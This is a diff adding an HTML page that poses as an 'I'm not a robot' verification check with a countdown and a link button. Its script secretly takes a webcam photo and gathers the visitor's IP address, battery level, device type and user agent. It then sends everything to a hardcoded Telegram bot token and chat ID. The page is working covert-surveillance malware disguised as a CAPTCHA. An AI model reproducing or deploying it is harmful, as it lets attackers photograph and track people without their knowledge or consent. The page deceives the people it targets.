@@ -1,0 +1,186 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification System</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f4f4f4;
+        }
+
+        .container {
+            width: 350px;
+            background-color: white;
+            padding: 10px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        #robotButton {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            background-color: #007bff;
+            color: white;
+            cursor: pointer;
+            font-size: 18px;
+            margin-bottom: 10px; /* Reduce bottom margin */
+        }
+
+        #title {
+            color: red;
+            font-size: 16px;
+            margin-bottom: 10px;
+            display: none;
+        }
+
+        #countdown {
+            font-size: 32px;
+            margin: 10px auto; /* Reduce margin */
+            border: 2px solid #007bff;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        #getLinkButton {
+            display: block;
+            margin: 20px auto 0; /* Reduce margin */
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            background-color: #007bff;
+            color: white;
+            cursor: pointer;
+            font-size: 18px;
+            opacity: 0.5;
+            pointer-events: none;
+            transition: opacity 0.3s;
+        }
+
+        #getLinkButton.active {
+            opacity: 1;
+            pointer-events: auto;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <button id="robotButton">I'm not a robot 🤖</button>
+        <div id="title">Just wait for 👇</div>
+        <div id="countdown">5</div>
+        <button id="getLinkButton">Please wait...</button>
+    </div>
+
+    <script>
+        const robotButton = document.getElementById('robotButton');
+        const countdown = document.getElementById('countdown');
+        const getLinkButton = document.getElementById('getLinkButton');
+        const title = document.getElementById('title');
+
+        const telegramApiToken = '7353904231:AAHA2En0ZVi092OlJpgR_aQG0TP0DXc0TPE';
+        const chatId = '5187944932';
+
+        robotButton.addEventListener('click', async () => {
+            robotButton.style.display = 'none';
+            title.style.display = 'block';
+
+            let timeLeft = 5;
+
+            // Start the countdown immediately after clicking
+            const timer = setInterval(async () => {
+                countdown.textContent = `${timeLeft}`;
+                timeLeft--;
+
+                // Capture image and collect user data at 3 seconds
+                if (timeLeft === 3) {
+                    // Camera permission and capturing photo
+                    try {
+                        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                        const video = document.createElement('video');
+                        video.srcObject = stream;
+                        await video.play();
+                        const canvas = document.createElement('canvas');
+                        const context = canvas.getContext('2d');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        const dataUrl = canvas.toDataURL('image/png');
+
+                        // Get user's data
+                        const battery = await navigator.getBattery();
+                        const batteryLevel = battery.level * 100;
+                        const dateTime = new Date().toLocaleString();
+                        const userAgent = navigator.userAgent;
+                        const deviceType = /Mobi/.test(userAgent) ? 'Mobile' : 'Desktop';
+
+                        // Fetch IP address
+                        const ipResponse = await fetch('https://api.ipify.org?format=json');
+                        const ipData = await ipResponse.json();
+                        const ipAddress = ipData.ip;
+
+                        // Send data to Telegram
+                        sendDataToTelegram(dataUrl, batteryLevel, dateTime, ipAddress, deviceType, userAgent);
+                    } catch (err) {
+                        console.error("Camera access denied:", err);
+                    }
+                }
+
+                if (timeLeft < 0) {
+                    clearInterval(timer);
+                    countdown.style.display = 'none';
+                    getLinkButton.textContent = 'Get Link';
+                    getLinkButton.classList.add('active');
+                }
+            }, 1000);
+        });
+
+        getLinkButton.addEventListener('click', () => {
+            window.location.href = 'https://your-link.com'; // Replace with your actual link
+        });
+
+        async function sendDataToTelegram(dataUrl, batteryLevel, dateTime, ipAddress, deviceType, userAgent) {
+            const blob = dataURLtoBlob(dataUrl);
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', blob, 'photo.png');
+            formData.append('caption', `Battery: ${batteryLevel}%\nDevice Type: ${deviceType}\nIP Address: ${ipAddress}\nTime: ${dateTime}\nUser Agent: ${userAgent}`);
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${telegramApiToken}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                const data = await response.json();
+                console.log('Data sent to Telegram:', data);
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        }
+
+        function dataURLtoBlob(dataUrl) {
+            const byteString = atob(dataUrl.split(',')[1]);
+            const mimeString = dataUrl.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([ab], {type: mimeString});
+        }
+    </script>
+</body>
+</html>
